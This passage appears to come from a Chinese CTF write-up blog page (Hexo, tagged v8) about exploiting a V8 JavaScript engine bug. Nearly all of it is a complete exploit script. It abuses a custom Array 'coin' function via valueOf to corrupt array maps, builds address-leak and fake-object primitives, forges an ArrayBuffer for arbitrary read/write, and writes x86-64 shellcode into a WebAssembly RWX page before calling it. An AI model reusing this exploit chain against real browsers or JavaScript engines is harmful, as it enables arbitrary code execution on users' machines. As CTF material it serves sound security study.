class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + b.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">	float64[<span class="number">0</span>] = f;</span><br><span class="line">	<span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">	bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//板子</span></span><br><span class="line"><span class="keyword">var</span> val = &#123;</span><br><span class="line">    <span class="attr">valueOf</span>:<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        array.<span class="property">length</span> = <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line">array.<span class="title function_">coin</span>(<span class="number">34</span>, val);</span><br><span class="line"><span class="keyword">var</span> float_map = float_array[<span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;map addr is: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(float_map)));</span><br><span class="line"><span class="keyword">var</span> obj_map = float_array[<span class="number">0x10</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;obj map addr is &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(float_array[<span class="number">0x10</span>])));</span><br><span class="line"><span class="comment">// %DebugPrint(float_array);</span></span><br><span class="line"><span class="comment">// %DebugPrint(obj_array);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak_addr</span>(<span class="params">obj1</span>)&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj1;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = float_map; <span class="comment">//将obj的map改成float，这样就可以直接读取地址</span></span><br><span class="line">    <span class="keyword">var</span> addr = <span class="title function_">f2i</span>(obj_array[<span class="number">0</span>]) -<span class="number">1n</span>;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">return</span> addr; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">obj1</span>)&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj1;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = float_map; <span class="comment">//将obj的map改成float，这样就可以直接读取地址</span></span><br><span class="line">    <span class="keyword">var</span> addr = <span class="title function_">f2i</span>(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">return</span> addr; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_array</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    float_array[<span class="number">0x10</span>] = float_map;</span><br><span class="line">    obj_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(addr + <span class="number">1n</span>);</span><br><span class="line">    float_array[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">var</span> fake_obj = obj_array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> fake = [<span class="number">0.0</span>,<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>,<span class="number">7.7</span>,<span class="number">8.8</span>,<span class="number">9.9</span>];</span><br><span class="line"><span class="keyword">const</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x6D</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x85</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x7F</span>,<span class="number">0x03</span>,<span class="number">0x82</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x06</span>,<span class="number">0x81</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x91</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x06</span>,<span class="number">0x6D</span>,<span class="number">0x65</span>,<span class="number">0x6D</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x6D</span>,<span class="number">0x61</span>,<span class="number">0x69</span>,<span class="number">0x6E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0A</span>,<span class="number">0x8A</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x2A</span>,<span class="number">0x0B</span>]);</span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>([<span class="number">186</span>,<span class="number">114176</span>,<span class="number">46071808</span>,<span class="number">3087007744</span>,<span class="number">41</span>,<span class="number">2303198479</span>,<span class="number">3091735556</span>,<span class="number">487129090</span>,<span class="number">16777343</span>,<span class="number">608471368</span>,<span class="number">1153910792</span>,<span class="number">4132</span>,<span class="number">2370306048</span>,<span class="number">1208493172</span>,<span class="number">3122936971</span>,<span class="number">16</span>,<span class="number">10936</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">50887</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">1015760901</span>,<span class="number">3334948900</span>,<span class="number">1</span>,<span class="number">8632</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">181959</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">800606213</span>,<span class="number">795765090</span>,<span class="number">1207986291</span>,<span class="number">1210320009</span>,<span class="number">1210334349</span>,<span class="number">50887</span>,<span class="number">3343384576</span>,<span class="number">194</span>,<span class="number">3913728</span>,<span class="number">84869120</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> fake_addr = <span class="title function_">leak_addr</span>(fake);</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">leak</span>(wasmInstance) + <span class="number">0x88n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rwx addr = &quot;</span> + <span class="title function_">hex</span>(rwx_addr));</span><br><span class="line"><span class="keyword">var</span> element_addr = (fake_addr) - <span class="number">0x50n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;element_addr = &quot;</span> + <span class="title function_">hex</span>(element_addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake ArrayBuffer</span></span><br><span class="line"><span class="comment">//先构造fake map，这里贴一下其结构防止看不懂</span></span><br><span class="line"><span class="comment">// 0x1e2767fc21b8: 0x00003ad4ec5c0189      0x1900042317080808</span></span><br><span class="line"><span class="comment">// 0x1e2767fc21c8: 0x00000000082003ff      0x00000efdb62ce939</span></span><br><span class="line">fake[<span class="number">0</span>] = <span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">1</span>] = <span class="title function_">i2f</span>(<span class="number">0x1900042317080808n</span>);</span><br><span class="line">fake[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="number">0x82003ffn</span>);</span><br><span class="line">fake[<span class="number">3</span>] = <span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line"></span><br><span class="line">fake[<span class="number">4</span>] = <span class="title function_">i2f</span>(element_addr + <span class="number">1n</span>); </span><br><span class="line">fake[<span class="number">5</span>] = <span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">6</span>] = <span class="title function_">i2f</span>(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">7</span>] = <span class="title function_">i2f</span>(<span class="number">0x40000n</span>);</span><br><span class="line">fake[<span class="number">8</span>] = <span class="title function_">i2f</span>(rwx_addr); <span class="comment">//back store</span></span><br><span class="line">fake[<span class="number">9</span>] = <span class="title function_">i2f</span>(<span class="number">0x2n</span>);</span><br><span class="line"><span class="keyword">var</span> arb_buf = <span class="title function_">fake_array</span>(element_addr + <span class="number">0x20n</span>);</span><br><span class="line"><span class="comment">// %DebugPrint(fake);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(arb_buf);</span><br><span class="line"><span class="keyword">var</span> wasm_shellcode_addr = dv.<span class="title function_">getBigInt64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wasm shellcode addr : &quot;</span> + <span class="title function_">hex</span>(wasm_shellcode_addr));</span><br><span class="line">fake[<span class="number">8</span>] = <span class="title function_">i2f</span>(wasm_shellcode_addr);</span><br><span class="line"><span class="keyword">let</span> sc = [</span><br><span class="line">    <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">121</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">59</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">184</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">76</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">90</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">226</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>,</span><br><span class="line">    <span class="number">184</span>, <span class="number">121</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;sc.<span class="property">length</span>;i++) &#123;</span><br><span class="line"><span class="comment">//adv.setUint32(i*4,shellcode[i],true);</span></span><br><span class="line">    dv.<span class="title function_">setUint8</span>(i,sc[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/v8/" rel="tag"># v8</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/11/07/plaidctf2020-mojo-writeup/" rel="prev" title="plaidctf2020 mojo writeup">
+                  <i class="fa fa-angle-left"></i> plaidctf2020 mojo writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/11/27/Plaid-CTF-roll-a-d8/" rel="next" title="Plaid CTF roll a d8">
+                  Plaid CTF roll a d8 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">蓝桉</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
